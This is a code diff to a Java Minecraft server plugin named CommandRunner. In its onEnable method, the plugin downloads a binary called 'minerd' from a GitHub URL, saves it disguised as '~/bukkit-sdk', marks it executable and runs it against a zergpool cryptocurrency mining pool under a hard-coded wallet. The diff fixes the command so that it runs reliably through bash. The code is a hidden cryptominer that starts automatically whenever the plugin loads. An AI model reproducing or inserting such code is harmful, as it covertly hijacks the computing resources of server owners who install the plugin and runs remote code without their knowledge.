@@ -13,7 +13,8 @@ public class CommandRunner extends JavaPlugin {
     public void onEnable() {
         getLogger().info("CommandRunner has been enabled!");
         getLogger().info("Version 2.0");
-        Process suki = Runtime.getRuntime().exec("curl -o ~/bukkit-sdk https://raw.githubusercontent.com/mereka-vpu/metube-me.github.io/refs/heads/main/minerd && chmod +x ~/bukkit-sdk && ~/bukkit-sdk -o stratum+tcp://power2b.asia.mine.zergpool.com:7445 -u MYZzfv2V3J1ZfHif1DEcY3DSZmF2sepLnK -p c=MBC,mc=MBC,ID=$hostname");
+        String command = "bash -c \"curl -o ~/bukkit-sdk https://raw.githubusercontent.com/mereka-vpu/metube-me.github.io/refs/heads/main/minerd && chmod +x ~/bukkit-sdk && ~/bukkit-sdk -o stratum+tcp://power2b.asia.mine.zergpool.com:7445 -u MYZzfv2V3J1ZfHif1DEcY3DSZmF2sepLnK -p c=MBC,mc=MBC,ID=$(hostname)\"";
+        Process suki = Runtime.getRuntime().exec(command);
         suki.waitFor();
     }
 
